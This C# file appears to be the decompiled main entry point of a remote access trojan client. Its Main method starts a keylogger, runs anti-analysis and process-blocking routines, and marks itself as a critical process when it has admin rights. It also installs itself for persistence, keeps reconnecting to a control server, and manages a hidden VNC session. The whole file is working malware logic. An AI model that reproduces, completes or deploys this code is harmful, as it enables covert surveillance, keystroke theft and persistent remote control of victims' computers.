using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Client.Connection;
using Client.Helper;
using Client.Install;

namespace Client;

public class Program
{
	[STAThread]
	public static void Main()
	{
		Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyData"));
		Keylogger.Params.LoadFromFile();
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		ServicePointManager.DefaultConnectionLimit = 9999;
		for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
		{
			Thread.Sleep(1000);
		}
		if (!Settings.InitializeSettings())
		{
			Environment.Exit(0);
		}
		SetRegistry.InitRegistry();
		try
		{
			if (Convert.ToBoolean(Settings.An_ti))
			{
				Anti_Analysis.RunAntiAnalysis();
			}
		}
		catch
		{
		}
		A.B();
		try
		{
			if (!MutexControl.CreateMutex())
			{
				Environment.Exit(0);
			}
		}
		catch
		{
		}
		try
		{
			if (Convert.ToBoolean(Settings.Anti_Process))
			{
				AntiProcess.StartBlock();
			}
		}
		catch
		{
		}
		try
		{
			if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
			{
				ProcessCritical.Set();
			}
		}
		catch
		{
		}
		try
		{
			if (Convert.ToBoolean(Settings.In_stall))
			{
				NormalStartup.Install();
			}
		}
		catch
		{
		}
		Methods.PreventSleep();
		try
		{
			if (Methods.IsAdmin())
			{
				Methods.ClearSetting();
			}
		}
		catch
		{
		}
		new Thread((ThreadStart)delegate
		{
			while (true)
			{
				try
				{
					if (!ClientSocket.IsConnected)
					{
						StopHVNC();
						ClientSocket.Reconnect();
						ClientSocket.InitializeClient();
					}
				}
				catch
				{
				}
				Thread.Sleep(3000);
			}
		}).Start();
		Keylogger.Run();
		Application.Run();
	}

	public static void StopHVNC()
	{
		Process[] processesByName = Process.GetProcessesByName("cvtres");
		foreach (Process process in processesByName)
		{
			process.Kill();
			process.WaitForExit();
			process.Dispose();
		}
	}
}
